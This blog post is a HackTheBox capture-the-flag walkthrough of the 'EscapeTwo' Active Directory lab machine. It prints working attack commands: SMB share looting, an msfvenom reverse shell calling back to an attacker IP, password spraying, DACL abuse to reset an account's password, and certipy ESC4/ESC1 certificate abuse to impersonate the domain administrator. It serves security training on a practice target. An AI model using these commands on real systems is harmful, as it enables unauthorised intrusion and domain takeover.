---
layout: post
title:  "HackTheBox | EscapeTwo"
description: "walkthrough of EscapeTwo machine, a Medium rated box from HackTheBox"
date: "2025-01-13"
pin: true
image:
  path: ../assets/img/ctf/hackthebox/escapetwo/escapetwo1.png
  alt: "escapetwo.htb"
category: "HackTheBox"
tags: ["Active Directory", "MSSQL", "BloodHound", "DACL Abuse", "ESC4", "ESC1"]
---

## Introduction
------------------------------------------------------------------------------------------
[EscapeTwo](https://app.hackthebox.com/machines/EscapeTwo) is a Medium-rated Windows Active Directory machine from Hack The Box. The box follows an assumed breach scenario (rose:KxEPkKe6R8su) and heavily focuses on Active Directory enumeration, MSSQL abuse, credential reuse, and Active Directory Certificate Services (AD CS) misconfigurations. The attack chain starts with valid low-privileged credentials, moves through SMB share enumeration, MSSQL exploitation, DACL abuse, and finally ends with domain compromise via AD CS (ESC4).

------------------------------------------------------------------------------------------

## Enumeration
<p style="text-align: justify;">We begin with a full TCP scan using RustScan:</p>

```bash
rustscan -a 10.10.116.81
```
![rustscan](./assets/img/ctf/hackthebox/escapetwo/escapetwo2.png)
<p style="text-align: justify;">We then perform service enumeration on the previously discovered open ports:</p>

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-11 21:20:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-11T21:22:24+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-11T21:22:24+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-01-11T20:52:33
| Not valid after:  2055-01-11T20:52:33
| MD5:   9b27:baae:662a:ed78:e24a:e05d:4b46:2fa7
|_SHA-1: e746:fd93:f67a:3eca:a55c:1509:4133:4afc:66aa:2eed
| ms-sql-info: 
|   10.129.169.161:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.169.161:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-01-11T21:22:24+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
|_ssl-date: 2025-01-11T21:22:24+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-11T21:22:24+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC
49737/tcp open  msrpc         Microsoft Windows RPC
64240/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-11T21:21:49
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```
<p style="text-align: justify;">Let's add the domain name and the domain controller hostname to the hosts file:</p>

```bash
echo '10.129.169.161  sequel.htb  DC01.sequel.htb'  >> /etc/hosts
```

## Foothold
<p style="text-align: justify;">
With the credentials provided with the box, we begin by enumerating SMB shares. We observe that the user <code>rose</code> has read and write access to the <strong>"Accounting Department"</strong> share. Using the <code>spider_plus</code> NetExec module, we dump all available shares for offline analysis.
</p>

```bash
nxc smb sequel.htb -u rose -p KxEPkKe6R8su --shares
nxc smb sequel.htb -u rose -p KxEPkKe6R8su -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./output
```
![shares enumeration](./assets/img/ctf/hackthebox/escapetwo/escapetwo3.png)
![spider_plus](./assets/img/ctf/hackthebox/escapetwo/escapetwo4.png)

<p style="text-align: justify;">
Within the <strong>"Accounting Department"</strong> file share, we discover two Excel files: <code>accounting_2024.xlsx</code> and <code>accounts.xlsx</code>. However, both files appear to be corrupted and cannot be opened normally. After some research on Excel file signatures, we find that valid <code>.xlsx</code> files should start with the magic bytes <code>50 4B 03 04</code>. By restoring the correct file signature, we are able to successfully open both documents. Further analysis of <code>accounts.xlsx</code> reveals multiple sets of credentials.
</p>

![Accounting Department Share](./assets/img/ctf/hackthebox/escapetwo/escapetwo5.png)
![Credentials - accounts.xlsx](./assets/img/ctf/hackthebox/escapetwo/escapetwo6.png)

<p style="text-align: justify;">
We reuse the credentials recovered from the SMB shares against the MSSQL service and discover that <code>sa:&lt;REDACTED&gt;</code> is a valid login on the database instance. Since <code>sa</code> has administrative privileges (dba) on MSSQL, we leverage NetExec’s MSSQL command execution feature to obtain a reverse shell on the target system as the <code>sql_svc</code> user.
</p>

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.140 LPORT=7575 -f exe -o escape.exe

nxc mssql dc01.sequel.htb --local-auth -u sa  -p '<REDACTED>' --put-file escape.exe C:\\Users\\Public\\escape.exe

nxc mssql dc01.sequel.htb --local-auth -u sa  -p '<REDACTED>' -x C:\\Users\\Public\\escape.exe

nc -lvnp 7575
```

![mssql](./assets/img/ctf/hackthebox/escapetwo/escapetwo7.png)
![Command Execution](./assets/img/ctf/hackthebox/escapetwo/escapetwo8.png)
![Reverse Shell](./assets/img/ctf/hackthebox/escapetwo/escapetwo9.png)

## Privilege Escalation
<p style="text-align: justify;">
Once connected as the <code>sql_svc</code> user, we are able to read the SQL Server configuration file located at <code>C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI</code>. This file contains sensitive installation parameters, including plaintext credentials for the <code>sql_svc</code> account as well as the <code>sa</code> password, confirming credential exposure through insecure configuration storage.
</p>

![Rsql-Configuration.INI](./assets/img/ctf/hackthebox/escapetwo/escapetwo10.png)

<p style="text-align: justify;">
Next, we perform a password spray using the <code>sql_svc</code> password recovered early from the SQL Server installation configuration file. This results in a successful credential reuse, as the same password is valid for the domain user <code>ryan</code>.
</p>

![Password Spaying](./assets/img/ctf/hackthebox/escapetwo/escapetwo11.png)

<p style="text-align: justify;">
We then connect to the domain controller using <code>evil-winrm</code>, as the user <code>ryan</code> is a member of the <strong>Remote Management Users</strong> group, which allows remote WinRM access.
</p>

![WinRm](./assets/img/ctf/hackthebox/escapetwo/escapetwo12.png)

<p style="text-align: justify;">
From this point, we perform additional Active Directory enumeration to identify potential privilege escalation paths. Using <code>ldapdomaindump</code> and <code>BloodHound</code>, we gather detailed information about users, groups, ACLs, and trust relationships within the domain.
</p>

```bash
ldapdomaindump  'ldap://sequel.htb' -u 'sequel.htb\rose' -p 'KxEPkKe6R8su' -o lootme
bloodhound-python -c All -d sequel.htb -u rose -p KxEPkKe6R8su -ns 10.129.169.161 --zip
```
![ldapdomaindump1](./assets/img/ctf/hackthebox/escapetwo/ldapdomdump.png)
![ldapdomaindump2](./assets/img/ctf/hackthebox/escapetwo/escapetwo13.png)
![bloodhound](./assets/img/ctf/hackthebox/escapetwo/escapetwo14.png)

<p style="text-align: justify;">
After importing the <code>bloodhound-python</code> data into BloodHound CE, we identify a clear privilege escalation path. The user <code>ryan</code> has <code>WriteOwner</code> privileges over the <code>ca_svc</code> account. Additionally, <code>ca_svc</code> is a member of the <strong>Cert Publishers</strong> group and has an AD CS misconfiguration corresponding to <strong>ESC4</strong>, due to <code>GenericAll</code> permissions on the <code>DunderMifflinAuthentication</code> certificate template.
</p>

![WriteOwner Edge](./assets/img/ctf/hackthebox/escapetwo/escapetwo15.png)
![CA_SVC ESC4](./assets/img/ctf/hackthebox/escapetwo/escapetwo16.png)
![GenericAll DunderMifflinAuthentication Certificate Template](./assets/img/ctf/hackthebox/escapetwo/escapetwo17.png)

<p style="text-align: justify;">
  First, we change the owner of the <code>ca_svc</code> user object to <code>ryan</code> and grant
  <code>ryan</code> full control over the <code>ca_svc</code> account. This allows us, as
  <code>ryan</code>, to reset the password of <code>ca_svc</code> without knowing the current one.
</p>

```bash
owneredit.py 'sequel.htb/ryan:WqSZAF6CysDQbGb3' -new-owner ryan -target ca_svc -action write 

dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'

net rpc password "ca_svc" "newP@ssword2022" -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "10.129.185.52"
```
![WriteOwner Abuse](./assets/img/ctf/hackthebox/escapetwo/escapetwo18.png)

<p style="text-align: justify;">
By abusing the <code>GenericAll</code> permissions on the vulnerable certificate template (<strong>ESC4</strong>), we modify the template configuration to make it exploitable under <strong>ESC1</strong>. Specifically, we update the template to allow user-supplied Subject Alternative Names (UPN). Once the template is weakened, we exploit ESC1 by requesting a certificate on behalf of the <code>administrator</code> account. The resulting certificate, combined with the <code>KPINIT</code> extension, allows us to authenticate as a domain administrator, recover the NT hash, and gain full access to the domain controller via WinRM.
</p>

```bash
# Modifing the Certificate Template to introduice ESC1
certipy template -username ca_svc@sequel.htb -password 'newP@ssword2022' -template DunderMifflinAuthentication -save-old -dc-ip $dc

# Administration Certificate
certipy req -username ca_svc@sequel.htb -password 'newP@ssword2022' -ca $CA  -template DunderMifflinAuthentication -upn administrator@sequel.htb -dc-ip $dc

# Certificate Authentication
certipy auth -pfx administrator.pfx
```
![ESC4-ESC1](./assets/img/ctf/hackthebox/escapetwo/escapetwo19.png)
![WinRM as Administrator](./assets/img/ctf/hackthebox/escapetwo/escapetwo20.png)

## Kill Chain Summary
1. Enumerate SMB shares and recover credentials from the Accounting Department share.
2. Reuse leaked credentials to authenticate to MSSQL as sa and achieve command execution.
3. Obtain a reverse shell as the sql_svc service account.
4. Extract plaintext credentials from the SQL Server installation configuration file.
5. Perform credential reuse to compromise the ryan domain account.
6. Abuse AD CS misconfigurations (ESC4 → ESC1) to impersonate the Administrator and gain Domain Admin access.


## References
[Magic Bytes](https://gist.github.com/neutrinoguy/b6cdbe854b34b9fc32c7bbe88b8eb261)<br>
[ESC4](https://www.beyondtrust.com/blog/entry/esc4-attacks)
